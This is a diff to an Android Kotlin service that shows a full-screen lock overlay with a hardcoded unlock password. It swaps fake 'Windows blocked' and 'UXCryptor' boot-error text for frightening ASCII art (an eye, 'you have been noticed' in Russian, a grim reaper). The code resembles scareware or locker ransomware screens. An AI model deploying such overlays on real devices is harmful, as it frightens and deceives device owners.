@@ -24,7 +24,7 @@ class LockOverlayService : Service() {
     private lateinit var mainText: TextView
     private lateinit var inputLayout: LinearLayout
     
-    private val PASSWORD = "12223914637140022111122333223617182918736527"
+    private val PASSWORD = "12908449519408372641"
 
     override fun onCreate() {
         super.onCreate()
@@ -41,15 +41,24 @@ class LockOverlayService : Service() {
         overlayView = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setBackgroundColor(Color.RED)
+            setBackgroundColor(Color.parseColor("#800000")) // Темно-красный
         }
         
         mainText = TextView(this).apply {
             setTextColor(Color.WHITE)
-            textSize = 12f
+            textSize = 16f
             typeface = Typeface.MONOSPACE
             gravity = Gravity.CENTER
-            text = "Booting Windows...\nBoot error: 0x03527737\nBoot error: 0x0266712\nBoot error: 0x02897593\nBoot error: 0x01447812\nBoot error: 0x0150974\nBoot error: 0x03873700\nBoot error: 0x0700882\nBoot error: 0x03803618\nMemory section at address 0x0424* is locked!\nService UXCryptor started.\n\n* Windows blocked!"
+            text = """
+                _..---====---.._
+                      _.-''     .----.     ''-._
+                    .'         /      \         '.
+                   <          |   ()   |          >
+                    '.         \      /         .'
+                      '-._      '----'      _.-'
+                          ''--...____...--''
+                             ВАС ЗАМЕТИЛИ
+            """.trimIndent()
         }
         overlayView.addView(mainText)
         
@@ -98,23 +107,31 @@ class LockOverlayService : Service() {
         val handler = Handler(Looper.getMainLooper())
         
         handler.postDelayed({
+            overlayView.setBackgroundColor(Color.parseColor("#B30000"))
             mainText.text = """
-                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
-                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
-                MMMMMMMM              MMMMMMMM
-                MMMMMM    MMMMMMMM    MMMMMMMM
-                MMMMM   MMMMMMMMMMMM   MMMMMMM
-                MMMM   MMMMMMMMMMMMMM   MMMMMM
-                MMM    MMMMMMMMMMMMMM    MMMM
-                MMM    MMMMMMMMMMMMMM    MMMM
-                MMMM   MMMMMMMMMMMMMM   MMMMMM
-                MMMMM   MMMMMMMMMMMM   MMMMMMM
-                MMMMMM    MMMMMMMM    MMMMMMMM
-                MMMMMMMM              MMMMMMMM
-                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
-                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+                 ...             
+               ;::::;            
+             ;::::; :;           
+           ;:::::'   :;          
+          ;:::::;     ;.         
+         ,:::::'       ;           OOO\
+         ::::::;       ;          OOOOO\
+         ;:::::;       ;         OOOOOOOO
+        ,;::::::;     ;'         / OOOOOOO
+      ;:::::::::`. ,,,;.        /  / DOOOOOO
+    .';:::::::::::::::::;,     /  /     DOOOO
+   ,::::::;::::::;;;;::::;,   /  /        DOOO
+  ;`::::::`'::::::;;;::::: ,#/  /          DOOO
+  :`:::::::`;::::::;;::: ;::#  /            DOOO
+  ::`:::::::`;:::::::: ;::::# /              DOO
+  `:`:::::::`;:::::: ;::::::#/               DOO
+   :::`:::::::`;; ;:::::::::##                OO
+   ::::`:::::::`;::::::::;:::#                OO
+   `:::::`::::::::::::;'`:;::#                O
+    `:::::`::::::::;' /  / `:#
+     ::::::`:::::;'  /  /   `#
             """.trimIndent()
-            mainText.textSize = 18f
+            mainText.textSize = 9f // Уменьшили, чтобы смерть влезла в экран
             
             handler.postDelayed({
                 overlayView.visibility = View.GONE
